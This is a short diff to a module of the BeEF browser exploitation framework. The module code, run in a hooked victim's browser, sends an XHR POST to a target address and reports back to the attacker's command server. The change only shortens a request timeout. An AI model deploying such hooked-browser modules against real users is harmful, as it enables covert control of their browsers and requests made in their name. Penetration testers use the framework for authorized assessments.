@@ -21,7 +21,7 @@ beef.execute(function() {
 	xhr.open("POST", uri, true);
 	xhr.setRequestHeader("Content-Type", "text/plain");
 	xhr.send(post_body);
-	setTimeout(function(){xhr.abort()}, 5000);
+	setTimeout(function(){xhr.abort()}, 2000);
 	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Message sent');
 
 });
